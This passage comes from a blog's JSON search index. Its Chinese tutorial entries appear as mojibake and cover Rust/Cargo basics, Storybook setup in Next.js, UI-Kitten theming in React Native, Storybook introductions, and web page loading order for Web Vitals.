æ„å»ºå·¥å…·å’ŒåŒ…ç®¡ç†å™¨çš„æœ€æ–°ç¨³å®šç‰ˆï¼Œå³ Cargoã€‚\n1 2 3 4 5 6 7 8 9  cargo--version//æ£€æŸ¥ Rust ç‰ˆæœ¬ cargonewhello-rust//åˆ›å»ºæ–°é¡¹ç›® cargobuild//æ„å»ºé¡¹ç›® cargorun//è¿è¡Œé¡¹ç›® cargotest//æµ‹è¯•é¡¹ç›® cargodoc//ä¸ºé¡¹ç›®æ„å»ºæ–‡æ¡£ cargopublish//å¯ä»¥å°†åº“å‘å¸ƒåˆ° crates.io   å››ã€åˆ›å»ºæ–°é¡¹ç›® cargo new hello-rust hello-rust\r|- Cargo.toml //ä¸º Rust çš„æ¸…å•æ–‡ä»¶ã€‚å…¶ä¸­åŒ…å«äº†é¡¹ç›®çš„å…ƒæ•°æ®å’Œä¾èµ–åº“ã€‚\r|- src |- main.rs //ç¼–å†™åº”ç”¨ä»£ç çš„åœ°æ–¹ã€‚ cargo run äº”ã€æ·»åŠ ä¾èµ– å¯ä»¥åœ¨crates.ioï¼Œå³ Rust åŒ…çš„ä»“åº“ä¸­æ‰¾åˆ°æ‰€æœ‰ç±»åˆ«çš„åº“ã€‚\nåœ¨ Rust ä¸­ï¼ŒæŠŠåŒ…ç§°ä½œâ€œcratesâ€ã€‚\nä¸¾ä¾‹ï¼šä½¿ç”¨åä¸º ferris-says\næ·»åŠ  //åœ¨ `Cargo.toml` æ–‡ä»¶ä¸­æ·»åŠ ä»¥ä¸‹ä¿¡æ¯ï¼ˆä» crates.io é¡µé¢ä¸Šè·å–ï¼‰\r[dependencies]\rferris-says = \u0026#34;0.2\u0026#34; cargo build â€¦ä¹‹å Cargo å°±ä¼šå®‰è£…è¯¥ä¾èµ–ã€‚\nè¿è¡Œæ­¤å‘½ä»¤ä¼šåˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ Cargo.lockï¼Œè¯¥æ–‡ä»¶è®°å½•äº†æœ¬åœ°æ‰€ç”¨ä¾èµ–åº“çš„ç²¾ç¡®ç‰ˆæœ¬ã€‚\nä½¿ç”¨ //main.rs\ruse ferris_says::say; è¿™æ ·å°±å¯ä»¥ä½¿ç”¨ ferris-says crate ä¸­å¯¼å‡ºçš„ say å‡½æ•°äº†ã€‚\nå…­ã€ç¼–å†™ä¸€ä¸ªå°åº”ç”¨ main.rs\nuse ferris_says::say;\ruse std::io::{ stdout, BufWriter };\rfn main() {\rlet out = b\u0026#34;Hello fellow Rustaceans!\u0026#34;;\rlet width = 24;\rlet mut writer = BufWriter::new(stdout());\rsay(out, width, \u0026amp;mut writer).unwrap();\r} cargo run ----------------------------\r\u0026lt; Hello fellow Rustaceans! \u0026gt;\r----------------------------\r\\\r\\\r_~^~^~_\r\\) / o o \\ (/\r\u0026#39;_ - _\u0026#39;\r/ \u0026#39;-----\u0026#39; \\\r","description":"æ„å»ºå¯é ä¸”é«˜æ•ˆè½¯ä»¶èƒ½åŠ›çš„è¯­è¨€","id":23,"section":"rust","tags":null,"title":"Rust","uri":"https://codthing.github.io/rust/rust-base/"},{"content":"ä¸€ã€å®‰è£…é…ç½®  åœ¨next.jsé¡¹ç›®ä¸­æ‰§è¡Œ\n npx sb init\ryarn storybook  .storybook/preview.js ä¸º Storybook é…ç½® Next.js Images\n + import * as NextImage from \u0026#34;next/image\u0026#34;;\r+ const OriginalNextImage = NextImage.default;\r+ Object.defineProperty(NextImage, \u0026#34;default\u0026#34;, {\rconfigurable: true,\rvalue: (props) =\u0026gt; (\r\u0026lt;OriginalNextImage\r{...props}\runoptimized\r/\u0026gt;\r),\r});  package.json ä¸º Storybook æä¾› Next.js å…¬å…±ç›®å½•\n {\r...\r\u0026#34;scripts\u0026#34;: {\r- \u0026#34;storybook\u0026#34;: \u0026#34;start-storybook -p 6006\u0026#34;,\r- \u0026#34;build-storybook\u0026#34;: \u0026#34;build-storybook\u0026#34;\r+ \u0026#34;storybook\u0026#34;: \u0026#34;start-storybook -p 6006 -s ./public\u0026#34;,\r+ \u0026#34;build-storybook\u0026#34;: \u0026#34;build-storybook -s public\u0026#34;\r},\r...\r}  é…ç½®å…¨å±€æ ·å¼ï¼Œè¿™é‡Œä½¿ç”¨ antd\n yarn add antd\r// `.storybook/preview.js` ä¸º Storybook é…ç½®å…¨å±€æ ·å¼\rimport \u0026#39;antd/dist/antd.css\u0026#39;;\rexport const parameters = {\r...\r...\rlayout: \u0026#39;fullscreen\u0026#39;\r}; äºŒã€ç¼–å†™æ•…äº‹æµç¨‹ ï¼ˆç»„ä»¶ -\u0026gt; æ•…äº‹ï¼‰  æ•…äº‹ç»†èŠ‚\n ä¸‰ã€args è·å– çŠ¶æ€æ•°æ® å’Œ äº‹ä»¶  ä½¿ç”¨å…¶ä»–æ•…äº‹çš„ args\n  ä¼ é€’ç»™Storybookçš„äº‹ä»¶çš„å†™æ³• (å¿…é¡»å¸¦æœ‰ \u0026hellip;props, å¦åˆ™äº‹ä»¶æ— æ³•è§¦å‘)\n å››ã€parameters é™æ€å‚æ•° \u0026amp; loaders åŠ è½½å™¨ parameters é€šå¸¸ç”¨äºæ§åˆ¶ Storybook åŠŸèƒ½å’Œæ’ä»¶çš„è¡Œä¸ºã€‚ï¼ˆä¸€èˆ¬æƒ…å†µä¸‹ä¸éœ€è¦ä½¿ç”¨ï¼Œä½†ä¸å¯ä¸çŸ¥ï¼‰\nloaders ç”¨äºåŠ è½½æ•…äº‹çš„æ•°æ®ï¼ŒåŠ è½½å™¨å¯ç”¨äºåŠ è½½ä»»ä½•èµ„äº§ã€å»¶è¿ŸåŠ è½½ç»„ä»¶æˆ–ä»è¿œç¨‹ API è·å–æ•°æ®ã€‚ï¼ˆä¸€èˆ¬ä¸éœ€è¦ä½¿ç”¨ï¼Œä½†ä¸å¯ä¸çŸ¥ï¼‰\näº”ã€æ·»åŠ æè¿°çš„æ–¹å¼ åœ¨ç»„ä»¶çš„ interface ä¸­ï¼Œç”¨å¤šè¡Œæ³¨é‡Šçš„æ–¹å¼ï¼ŒSBä¼šè‡ªåŠ¨æ·»åŠ åˆ°Docsä¸­çš„æè¿°\næ³¨æ„ï¼šæ³¨é‡Šæ ¼å¼ä¸€å®šè¦è¿™æ ·ï¼Œå¦åˆ™ä¸èƒ½æ˜¾ç¤º; å¦‚æœä¸èƒ½è‡ªåŠ¨åˆ·æ–°ï¼Œåˆ™éœ€è¦é‡å¯ yarn storybook\n1 2 3 4 5 6 7  interface ButtonProps { /** * æµ‹è¯• */ primary?: boolean; }   ","description":"","id":24,"section":"react","tags":null,"title":"Storybook æœ€ä½³å®è·µ","uri":"https://codthing.github.io/react/storybook/sb-bp/"},{"content":"ä¸€ã€å®‰è£… //ç¡®ä¿å·²å®‰è£… React Native CLI\rnpm un -g react-native-cli \u0026amp;\u0026amp; npm i -g @react-native-community/cli\r//ç”¨ Kitten æ¨¡æ¿åˆ›å»ºæ–°é¡¹ç›®\rnpx react-native init MyApp --template @ui-kitten/template-js\r//å¯åŠ¨åº”ç”¨\ryarn android äºŒã€é…ç½®è·¯ç”±ï¼ˆé…ç½®åº”ç”¨ç¨‹åºåœ¨å±å¹•ä¹‹é—´å¯¼èˆªï¼ŒåŸºäº React Navigationï¼‰ 1.å®‰è£…\n//æ ¸å¿ƒåº“\ryarn add react-navigation\r//å¯¼èˆªå™¨ä½¿ç”¨çš„ä¾èµ–é¡¹\ryarn add react-native-reanimated react-native-gesture-handler react-native-screens react-native-safe-area-context @react-native-community/masked-view 2.è¦å®Œæˆreact-native-gesture-handlerAndroidçš„å®‰è£…ï¼Œè¯·å¯¹MainActivity.javaè¿›è¡Œä»¥ä¸‹ä¿®æ”¹\npackage com.reactnavigation.example;\rimport com.facebook.react.ReactActivity;\r+ import com.facebook.react.ReactActivityDelegate;\r+ import com.facebook.react.ReactRootView;\r+ import com.swmansion.gesturehandler.react.RNGestureHandlerEnabledRootView;\rpublic class MainActivity extends ReactActivity {\r@Override\rprotected String getMainComponentName() {\rreturn \u0026#34;Example\u0026#34;;\r}\r+ @Override\r+ protected ReactActivityDelegate createReactActivityDelegate() {\r+ return new ReactActivityDelegate(this, getMainComponentName()) {\r+ @Override\r+ protected ReactRootView createRootView() {\r+ return new RNGestureHandlerEnabledRootView(MainActivity.this);\r+ }\r+ };\r+ }\r} 3.ç„¶åå°†ä»¥ä¸‹å†…å®¹æ·»åŠ åˆ°æ¡ç›®æ–‡ä»¶çš„é¡¶éƒ¨ï¼Œä¾‹å¦‚index.jsæˆ–App.js\nimport \u0026#39;react-native-gesture-handler\u0026#39;;  æ³¨æ„ï¼šä½¿ç”¨å¯¼èˆªå™¨ï¼ˆä¾‹å¦‚ stack navigator å †æ ˆå¯¼èˆªå™¨ï¼‰æ—¶ï¼Œéœ€è¦æŒ‰ç…§è¯¥å¯¼èˆªå™¨çš„å®‰è£…è¯´æ˜è¿›è¡Œæ“ä½œï¼Œä»¥è·å–ä»»ä½•å…¶ä»–ä¾èµ–é¡¹ã€‚ å¦‚æœé‡åˆ°é”™è¯¯â€œæ— æ³•è§£ææ¨¡å—â€ï¼Œåˆ™éœ€è¦åœ¨é¡¹ç›®ä¸­å®‰è£…è¯¥æ¨¡å—ã€‚\n ä¸‰ã€ä¸»é¢˜å·¥å…· Eva Colors å››ã€é…ç½®ä¸»é¢˜  åˆ›å»ºä¸»é¢˜ context  //åˆ›å»º theme-context.js æ–‡ä»¶å¹¶ç²˜è´´ä»¥ä¸‹ä»£ç \rimport React from \u0026#39;react\u0026#39;;\rexport const ThemeContext = React.createContext({\rtheme: \u0026#39;light\u0026#39;,\rtoggleTheme: () =\u0026gt; {},\r});\r//å°±Reactè€Œè¨€ï¼Œcontextæä¾›äº†ä¸€ç§é€šè¿‡ç»„ä»¶æ ‘ä¼ é€’æ•°æ®çš„æ–¹æ³•ï¼Œè€Œä¸å¿…åœ¨æ¯ä¸ªçº§åˆ«æ‰‹åŠ¨ä¼ é€’é“å…·ã€‚\r//ä½¿ç”¨ä¸Šé¢çš„ä»£ç ï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªThemeContexté€šè¿‡ç»„ä»¶æ ‘æä¾›æœ‰å…³å½“å‰ä¸»é¢˜çš„ä¿¡æ¯ï¼Œå› æ­¤ä»»ä½•ç»„ä»¶éƒ½å¯ä»¥ä½¿ç”¨å®ƒã€‚ä¸»é¢˜ä¸Šä¸‹æ–‡çš„å½“å‰å€¼ä¸ºï¼š\r//theme-ç¡®å®šå½“å‰ä¸»é¢˜çš„åç§°ã€‚\r//toggleTheme -å¯ä»¥åˆ‡æ¢å½“å‰ä¸»é¢˜çš„functionã€‚ æ³¨å†Œä¸»é¢˜  //æ‰“å¼€ App.js å¹¶ç²˜è´´ä¸‹é¢çš„ä»£ç \rimport React from \u0026#39;react\u0026#39;;\rimport * as eva from \u0026#39;@eva-design/eva\u0026#39;;\rimport { ApplicationProvider, IconRegistry } from \u0026#39;@ui-kitten/components\u0026#39;;\rimport { EvaIconsPack } from \u0026#39;@ui-kitten/eva-icons\u0026#39;;\rimport { AppNavigator } from \u0026#39;./navigation.component\u0026#39;;\rimport { ThemeContext } from \u0026#39;./theme-context\u0026#39;; //å¯¼å…¥ThemeContext\rexport default () =\u0026gt; {\r//åˆ›å»º{ theme, toggleTheme }ï¼Œæ­¤å¯¹è±¡æˆä¸ºäº†ä¸»é¢˜contextï¼Œä½¿ç”¨useStateå‡½æ•°åˆ›å»ºä¸€ä¸ªåº”ç”¨ç¨‹åºçŠ¶æ€ï¼Œä»¥ä¿å­˜å½“å‰ä¸»é¢˜çš„åç§°\rconst [theme, setTheme] = React.useState(\u0026#39;light\u0026#39;);\r//åˆ‡æ¢å½“å‰ä¸»é¢˜function\rconst toggleTheme = () =\u0026gt; {\rconst nextTheme = theme === \u0026#39;light\u0026#39; ? \u0026#39;dark\u0026#39; : \u0026#39;light\u0026#39;;\rsetTheme(nextTheme);\r};\rreturn (\r\u0026lt;\u0026gt;\r\u0026lt;IconRegistry icons={EvaIconsPack}/\u0026gt;\r\u0026lt;ThemeContext.Provider value={{ theme, toggleTheme }}\u0026gt;\r\u0026lt;ApplicationProvider {...eva} theme={eva[theme]}\u0026gt;\r\u0026lt;AppNavigator/\u0026gt;\r\u0026lt;/ApplicationProvider\u0026gt;\r\u0026lt;/ThemeContext.Provider\u0026gt;\r\u0026lt;/\u0026gt;\r);\r}; ç”¨æ³•  //åœ¨ home.component.js ä¸­é€šè¿‡æŒ‰ä¸‹æŒ‰é’®è¿›è¡Œä¿®æ”¹ä»¥åˆ‡æ¢ä¸»é¢˜\rimport React from \u0026#39;react\u0026#39;;\rimport { SafeAreaView } from \u0026#39;react-native\u0026#39;;\rimport { Button, Layout } from \u0026#39;@ui-kitten/components\u0026#39;;\rimport { ThemeContext } from \u0026#39;./theme-context\u0026#39;;\rexport const HomeScreen = ({ navigation }) =\u0026gt; {\rconst themeContext = React.useContext(ThemeContext);\rconst navigateDetails = () =\u0026gt; {\rnavigation.navigate(\u0026#39;Details\u0026#39;);\r};\rreturn (\r\u0026lt;SafeAreaView style={{ flex: 1 }}\u0026gt;\r\u0026lt;Layout style={{ flex: 1, justifyContent: \u0026#39;center\u0026#39;, alignItems: \u0026#39;center\u0026#39; }}\u0026gt;\r\u0026lt;Button style={{ marginVertical: 4 }} onPress={navigateDetails}\u0026gt;OPEN DETAILS\u0026lt;/Button\u0026gt;\r\u0026lt;Button style={{ marginVertical: 4 }} onPress={themeContext.toggleTheme}\u0026gt;TOGGLE THEME\u0026lt;/Button\u0026gt;\r\u0026lt;/Layout\u0026gt;\r\u0026lt;/SafeAreaView\u0026gt;\r);\r}; äº”ã€æ³¨æ„äº‹é¡¹ å¯¼å…¥ import ç»„ä»¶ä¸€å®šè¦ç”¨{ç»„ä»¶å}åŒ…è£¹ä½ï¼Œå¦åˆ™å°†ä¸èƒ½æ­£ç¡®è§£æã€‚\n","description":"","id":25,"section":"react-native","tags":null,"title":"UI-Kitten åŸºç¡€","uri":"https://codthing.github.io/react-native/ui/ui-kitten/kitten-base/"},{"content":"Storybook æ˜¯ä¸€ä¸ªç”¨äº UI å¼€å‘çš„å·¥å…·ã€‚\nå®ƒé€šè¿‡éš”ç¦»ç»„ä»¶ä½¿å¼€å‘æ›´å¿«æ›´å®¹æ˜“ã€‚ ä¸€æ¬¡å¤„ç†ä¸€ä¸ªç»„ä»¶ã€‚\nå¯ä»¥å¼€å‘æ•´ä¸ª UIï¼Œè€Œæ— éœ€å¯åŠ¨å¤æ‚çš„å¼€å‘å †æ ˆã€å°†æŸäº›æ•°æ®å¼ºåˆ¶è¾“å…¥æ•°æ®åº“æˆ–æµè§ˆåº”ç”¨ç¨‹åºã€‚\nä½¿ç”¨ Storybook åœ¨ Web åº”ç”¨ç¨‹åºä¸­æ„å»ºå°çš„åŸå­ç»„ä»¶å’Œå¤æ‚çš„é¡µé¢ã€‚\nå¦‚æœæ˜¯ UIï¼Œåˆ™å¯ä»¥ä½¿ç”¨ Storybook æ„å»ºå®ƒã€‚\nStorybook å¯å¸®åŠ©è®°å½•ç»„ä»¶ä»¥ä¾›é‡ç”¨ï¼Œå¹¶è‡ªåŠ¨å¯¹ç»„ä»¶è¿›è¡Œå¯è§†åŒ–æµ‹è¯•ä»¥é˜²æ­¢å‡ºç°é”™è¯¯ã€‚\nä½¿ç”¨æ’ä»¶ç”Ÿæ€ç³»ç»Ÿæ‰©å±• Storybookï¼Œå¯å¸®åŠ©æ‰§è¡Œè¯¸å¦‚å¾®è°ƒå“åº”å¼å¸ƒå±€æˆ–éªŒè¯å¯è®¿é—®æ€§ç­‰æ“ä½œã€‚\nStorybook ä¸æœ€æµè¡Œçš„ JavaScript UI æ¡†æ¶é›†æˆï¼Œå¹¶ä¸”ï¼ˆå®éªŒæ€§åœ°ï¼‰æ”¯æŒæœåŠ¡å™¨æ¸²æŸ“çš„ç»„ä»¶æ¡†æ¶ï¼Œä¾‹å¦‚ Ruby on Railsã€‚\n\rçŸ¥è¯†ç‚¹   CDD ç»„ä»¶é©±åŠ¨å¼€å‘\n  æ•™ç¨‹\n  ","description":"React Storybook ç®€ä»‹","id":26,"section":"react","tags":null,"title":"ä»‹ç»","uri":"https://codthing.github.io/react/storybook/sb-started/sb-introduction/"},{"content":"å¦‚ä½•ä½¿ç”¨ Storybook æµ‹è¯• UI Storybook ä¸ºéš”ç¦»æµ‹è¯•ç»„ä»¶æä¾›äº†ä¸€ä¸ªæ´å‡€å®¤ç¯å¢ƒã€‚\næ— è®ºå¤šä¹ˆå¤æ‚ï¼Œæ•…äº‹éƒ½å¯ä»¥è½»æ¾æ¢ç´¢ç»„ä»¶çš„æ‰€æœ‰å˜ä½“ã€‚\nè¿™æ„å‘³ç€æ•…äº‹æ˜¯ UI æµ‹è¯•ç­–ç•¥çš„å®ç”¨èµ·ç‚¹ã€‚\nå°†æ•…äº‹ä½œä¸º UI å¼€å‘çš„ä¸€ä¸ªè‡ªç„¶ç»„æˆéƒ¨åˆ†ï¼Œæµ‹è¯•è¿™äº›æ•…äº‹æ˜¯é˜²æ­¢éšç€æ—¶é—´çš„æ¨ç§»å‡ºç° UI é”™è¯¯çš„ä¸€ç§çœåŠ›çš„æ–¹æ³•ã€‚\næœ€ç®€å•çš„æµ‹è¯•æ–¹æ³•æ˜¯æ‰‹åŠ¨â€œæŠ½æŸ¥â€ã€‚\næœ¬åœ°è¿è¡Œ Storybookï¼Œç„¶åè§‚å¯Ÿæ¯ä¸ªæ•…äº‹ä»¥éªŒè¯å…¶å¤–è§‚å’Œè¡Œä¸ºã€‚\nåœ¨çº¿å‘å¸ƒæ•…äº‹ä¹¦ä»¥å…±äº«å¤åˆ¶å“å¹¶è®©é˜Ÿå‹å‚ä¸å…¶ä¸­ã€‚\nStorybook è¿˜é™„å¸¦å·¥å…·ã€æµ‹è¯•è¿è¡Œç¨‹åºä»¥åŠä¸æ›´å¼ºå¤§çš„ JavaScript ç”Ÿæ€ç³»ç»Ÿçš„ä¾¿æ·é›†æˆï¼Œä»¥æ‰©å±• UI æµ‹è¯•è¦†ç›–èŒƒå›´ã€‚\n","description":"","id":27,"section":"react","tags":null,"title":"ä»‹ç»","uri":"https://codthing.github.io/react/storybook/sb-test/sb-test-introduction/"},{"content":"æ³¨æ„ï¼šæœ¬æ–‡æ·±å— Chrome ä¸­ Aurora å›¢é˜Ÿçš„è§è§£çš„å½±å“ï¼Œå°¤å…¶æ˜¯ Shubhie Panickerï¼Œä»–ä¸€ç›´åœ¨ç ”ç©¶æœ€ä½³åŠ è½½é¡ºåºã€‚\nåœ¨æ¯ä¸ªæˆåŠŸçš„ç½‘é¡µåŠ è½½ä¸­ï¼Œä¸€äº›å…³é”®ç»„ä»¶å’Œèµ„æºä¼šåœ¨é€‚å½“çš„æ—¶å€™å˜ä¸ºå¯ç”¨ï¼Œä»è€Œä¸ºæ‚¨æä¾›æµç•…çš„åŠ è½½ä½“éªŒã€‚\nè¿™å¯ç¡®ä¿ç”¨æˆ·è®¤ä¸ºåº”ç”¨ç¨‹åºçš„æ€§èƒ½éå¸¸å‡ºè‰²ã€‚è¿™ç§å‡ºè‰²çš„ç”¨æˆ·ä½“éªŒé€šå¸¸ä¹Ÿåº”è¯¥è½¬åŒ–ä¸ºé€šè¿‡ Core Web Vitalsã€‚\nç”¨äºè¡¡é‡æ€§èƒ½çš„å…³é”®æŒ‡æ ‡ï¼Œä¾‹å¦‚ First Content Paintã€Largest Contentful Paintã€First Input Delay ç­‰ï¼Œç›´æ¥å–å†³äºå…³é”®èµ„æºçš„åŠ è½½é¡ºåºã€‚\nä¾‹å¦‚ï¼Œå¦‚æœæ²¡æœ‰åŠ è½½åƒè‹±é›„å›¾åƒè¿™æ ·çš„å…³é”®èµ„æºï¼Œé¡µé¢å°±ä¸èƒ½æœ‰å®ƒçš„ LCPã€‚\nè¿™ç¯‡æ–‡ç« è®²çš„æ˜¯èµ„æºçš„åŠ è½½é¡ºåºå’ŒWeb Vitalsä¹‹é—´çš„å…³ç³»ã€‚æˆ‘ä»¬çš„ç›®æ ‡æ˜¯æä¾›æœ‰å…³å¦‚ä½•ä¼˜åŒ–åŠ è½½é¡ºåºä»¥è·å¾—æ›´å¥½çš„ Web é‡è¦ä¿¡æ¯çš„æ˜ç¡®æŒ‡å¯¼ã€‚\nåœ¨å»ºç«‹ä¸€ä¸ªç†æƒ³çš„åŠ è½½é¡ºåºä¹‹å‰ï¼Œé¦–å…ˆå°è¯•ç†è§£ä¸ºä»€ä¹ˆå¾ˆéš¾è·å¾—æ­£ç¡®çš„åŠ è½½é¡ºåºã€‚\n\rä¸ºä»€ä¹ˆéš¾ä»¥å®ç°æœ€ä½³åŠ è½½ï¼Ÿ æˆ‘ä»¬æœ‰ç‹¬ç‰¹çš„æœºä¼šä¸ºæˆ‘ä»¬åˆä½œä¼™ä¼´çš„è®¸å¤šç½‘ç«™è¿›è¡Œæ€§èƒ½åˆ†æã€‚ å‘ç°äº†å¤šä¸ªç±»ä¼¼çš„é—®é¢˜ï¼Œè¿™äº›é—®é¢˜å›°æ‰°ç€ä¸åŒåˆä½œä¼™ä¼´ç½‘ç«™çš„é¡µé¢é«˜æ•ˆåŠ è½½ã€‚\nå¼€å‘äººå‘˜çš„æœŸæœ›ä¸æµè§ˆå™¨å¦‚ä½•ä¼˜å…ˆè€ƒè™‘é¡µé¢ä¸Šçš„èµ„æºä¹‹é—´é€šå¸¸å­˜åœ¨é‡å¤§å·®è·ã€‚ è¿™é€šå¸¸ä¼šå¯¼è‡´æ¬¡ä¼˜çš„æ€§èƒ½å¾—åˆ†ã€‚ æˆ‘ä»¬è¿›ä¸€æ­¥åˆ†æä»¥å‘ç°é€ æˆè¿™ç§å·®è·çš„åŸå› ï¼Œä»¥ä¸‹å‡ ç‚¹æ€»ç»“äº†æˆ‘ä»¬åˆ†æçš„æœ¬è´¨ã€‚\næ¬¡ä¼˜æµ‹åº\nWeb Vitals ä¼˜åŒ–ä¸ä»…éœ€è¦å¾ˆå¥½åœ°ç†è§£æ¯ä¸ªæŒ‡æ ‡çš„å«ä¹‰ï¼Œè¿˜éœ€è¦å®ƒä»¬å‡ºç°çš„é¡ºåºä»¥åŠå®ƒä»¬ä¸ä¸åŒå…³é”®èµ„æºçš„å…³ç³»ã€‚ FCP å‘ç”Ÿåœ¨ LCP ä¹‹å‰ï¼Œè€Œ LCP å‘ç”Ÿåœ¨ FID ä¹‹å‰ã€‚ å› æ­¤ï¼Œå®ç° FCP æ‰€éœ€çš„èµ„æºåº”ä¼˜å…ˆäº LCP æ‰€éœ€çš„èµ„æºï¼Œå…¶æ¬¡æ˜¯ FID æ‰€éœ€çš„èµ„æºã€‚\nèµ„æºé€šå¸¸æ²¡æœ‰ä»¥æ­£ç¡®çš„é¡ºåºæ’åºå’Œæµæ°´çº¿åŒ–ã€‚ è¿™å¯èƒ½æ˜¯å› ä¸ºå¼€å‘äººå‘˜æ²¡æœ‰æ„è¯†åˆ°æŒ‡æ ‡å¯¹èµ„æºè´Ÿè½½çš„ä¾èµ–æ€§ã€‚ å› æ­¤ï¼Œæœ‰æ—¶æ— æ³•åœ¨æ­£ç¡®çš„æ—¶é—´ä½¿ç”¨ç›¸å…³èµ„æºæ¥è§¦å‘ç›¸åº”çš„æŒ‡æ ‡ã€‚\nä¾‹å­ï¼š\n  a) åˆ° FCP è§¦å‘æ—¶ï¼Œè‹±é›„å›¾åƒåº”è¯¥å¯ç”¨äºè§¦å‘ LCPã€‚\n  b) åˆ° LCP è§¦å‘æ—¶ï¼ŒJavaScript (JS) åº”è¯¥è¢«ä¸‹è½½ã€è§£æå¹¶å‡†å¤‡å¥½ï¼ˆæˆ–å·²ç»æ‰§è¡Œï¼‰ä»¥è§£é™¤é˜»æ­¢äº¤äº’ (FID)ã€‚\n  ç½‘ç»œ/CPU åˆ©ç”¨ç‡\nèµ„æºä¹Ÿæ²¡æœ‰é€‚å½“åœ°æµæ°´çº¿åŒ–ä»¥ç¡®ä¿å……åˆ†åˆ©ç”¨ CPU å’Œç½‘ç»œã€‚ å½“è¿›ç¨‹å—ç½‘ç»œé™åˆ¶æ—¶ï¼Œè¿™ä¼šå¯¼è‡´ CPU ä¸Šçš„â€œæ­»åŒºæ—¶é—´â€ï¼Œåä¹‹äº¦ç„¶ã€‚\nä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­æ˜¯å¯ä»¥åŒæ—¶æˆ–é¡ºåºä¸‹è½½çš„è„šæœ¬ã€‚ ç”±äºåœ¨å¹¶å‘ä¸‹è½½æœŸé—´å¸¦å®½è¢«åˆ’åˆ†ï¼Œå› æ­¤ä¸‹è½½æ‰€æœ‰è„šæœ¬çš„æ€»æ—¶é—´å¯¹äºé¡ºåºä¸‹è½½å’Œå¹¶å‘ä¸‹è½½æ˜¯ç›¸åŒçš„ã€‚ å¦‚æœæ‚¨åŒæ—¶ä¸‹è½½è„šæœ¬ï¼Œåˆ™åœ¨ä¸‹è½½æœŸé—´ CPU æœªå¾—åˆ°å……åˆ†åˆ©ç”¨ã€‚ ä½†æ˜¯ï¼Œå¦‚æœæ‚¨æŒ‰é¡ºåºä¸‹è½½è„šæœ¬ï¼Œåˆ™ CPU å¯ä»¥åœ¨ä¸‹è½½åç«‹å³å¼€å§‹å¤„ç†ç¬¬ä¸€ä¸ªè„šæœ¬ã€‚ è¿™ä¼šå¯¼è‡´æ›´å¥½çš„ CPU å’Œç½‘ç»œåˆ©ç”¨ç‡ã€‚\nç¬¬ä¸‰æ–¹ (3P) äº§å“\né€šå¸¸éœ€è¦ 3P åº“æ¥å‘ç½‘ç«™æ·»åŠ é€šç”¨ç‰¹æ€§å’ŒåŠŸèƒ½ã€‚ ç¬¬ä¸‰æ–¹åŒ…æ‹¬å¹¿å‘Šã€åˆ†æã€ç¤¾äº¤å°éƒ¨ä»¶ã€å®æ—¶èŠå¤©å’Œå…¶ä»–æ”¯æŒç½‘ç«™çš„åµŒå…¥ã€‚ ç¬¬ä¸‰æ–¹åº“å¸¦æœ‰è‡ªå·±çš„ JavaScriptã€å›¾åƒã€å­—ä½“ç­‰\n3P äº§å“é€šå¸¸æ²¡æœ‰åŠ¨åŠ›ä¼˜åŒ–å’Œæ”¯æŒæ¶ˆè´¹è€…ç½‘ç«™çš„åŠ è½½æ€§èƒ½ã€‚ å®ƒä»¬å¯èƒ½å…·æœ‰æ²‰é‡çš„ JavaScript æ‰§è¡Œæˆæœ¬ï¼Œä»è€Œå»¶è¿Ÿäº¤äº’ï¼Œæˆ–å¦¨ç¢ä¸‹è½½å…¶ä»–å…³é”®èµ„æºã€‚\nåŒ…å« 3P äº§å“çš„å¼€å‘äººå‘˜å¯èƒ½æ›´å…³æ³¨ä»–ä»¬åœ¨åŠŸèƒ½æ–¹é¢å¢åŠ çš„ä»·å€¼ï¼Œè€Œä¸æ˜¯æ€§èƒ½å½±å“ã€‚ å› æ­¤ï¼Œæœ‰æ—¶ä¼šéšæ„æ·»åŠ  3P èµ„æºï¼Œè€Œæ²¡æœ‰å……åˆ†è€ƒè™‘å®ƒå¦‚ä½•é€‚åº”æ•´ä¸ªåŠ è½½é¡ºåºã€‚ è¿™ä½¿ä»–ä»¬éš¾ä»¥æ§åˆ¶å’Œå®‰æ’ã€‚\nå¹³å°æ€ªç™–\næµè§ˆå™¨åœ¨å¯¹è¯·æ±‚è¿›è¡Œä¼˜å…ˆçº§æ’åºå’Œå®ç°æç¤ºçš„æ–¹å¼ä¸Šå¯èƒ½æœ‰æ‰€ä¸åŒã€‚ å¦‚æœæ‚¨å¯¹å¹³å°åŠå…¶æ€ªç™–æœ‰æ·±å…¥çš„äº†è§£ï¼Œä¼˜åŒ–ä¼šæ›´å®¹æ˜“ã€‚ ç‰¹å®šæµè§ˆå™¨çš„ç‰¹å®šè¡Œä¸ºä½¿å¾—éš¾ä»¥ä¸€è‡´åœ°å®ç°æ‰€éœ€çš„åŠ è½½é¡ºåºã€‚\nè¿™æ–¹é¢çš„ä¸€ä¸ªä¾‹å­æ˜¯é“¬å¹³å°ä¸Šçš„é¢„åŠ è½½é”™è¯¯ã€‚ Preload (\u0026lt;link rel=preload\u0026gt;) æŒ‡ä»¤å¯ä»¥ç”¨æ¥å‘Šè¯‰æµè§ˆå™¨å°½å¿«ä¸‹è½½å…³é”®èµ„æºã€‚ ä»…å½“æ‚¨ç¡®å®šå°†åœ¨å½“å‰é¡µé¢ä¸Šä½¿ç”¨è¯¥èµ„æºæ—¶æ‰åº”ä½¿ç”¨å®ƒã€‚ Chromium ä¸­çš„é”™è¯¯å¯¼è‡´å®ƒçš„è¡Œä¸ºä½¿å¾—é€šè¿‡ \u0026lt;link rel=preload\u0026gt; å‘å‡ºçš„è¯·æ±‚å§‹ç»ˆåœ¨é¢„åŠ è½½æ‰«æå™¨çœ‹åˆ°çš„å…¶ä»–è¯·æ±‚ä¹‹å‰å¯åŠ¨ï¼Œ\nå³ä½¿è¿™äº›è¯·æ±‚å…·æœ‰æ›´é«˜çš„ä¼˜å…ˆçº§ã€‚ è¯¸å¦‚æ­¤ç±»çš„é—®é¢˜ä¼šå½±å“ä¼˜åŒ–è®¡åˆ’ã€‚\nHTTP2 ä¼˜å…ˆçº§\nåè®®æœ¬èº«å¹¶æ²¡æœ‰æä¾›å¾ˆå¤šç”¨äºè°ƒæ•´èµ„æºé¡ºåºå’Œä¼˜å…ˆçº§çš„é€‰é¡¹æˆ–æ—‹é’®ã€‚\nå³ä½¿å¯ä»¥ä½¿ç”¨æ›´å¥½çš„ä¼˜å…ˆçº§åŸè¯­ï¼ŒHTTP2 